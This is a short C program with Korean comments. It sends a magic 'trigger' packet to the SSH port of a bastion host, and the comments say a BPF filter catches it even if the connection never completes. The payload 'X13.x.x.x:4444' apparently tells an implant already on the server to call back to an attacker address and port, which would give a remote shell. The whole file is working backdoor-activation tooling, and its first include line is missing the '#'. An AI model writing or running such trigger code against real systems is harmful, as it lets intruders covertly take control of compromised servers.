include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void) {
    int sock;
    struct sockaddr_in sin;
    const char *payload = "X13.x.x.x:4444"; // 트리거 신호

    // TCP 소켓으로 변경
    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        perror("socket error");
        return 1;
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(22); // SSH 포트
    inet_aton("15.x.x.x", &sin.sin_addr); // 타겟(베스천) 공인 IP

    printf("Connecting to Bastion SSH for triggering...\n");

    // TCP 연결 시도 (이 과정에서 패킷이 전송됨)
    // 연결이 완전히 맺어지지 않아도 패킷만 전달되면 BPF가 낚아챕니다.
    connect(sock, (struct sockaddr *)&sin, sizeof(sin));

    // 신호 전송
    send(sock, payload, strlen(payload), 0);

    close(sock);
    printf("Trigger payload sent to TCP/22.\n");
    return 0;
}
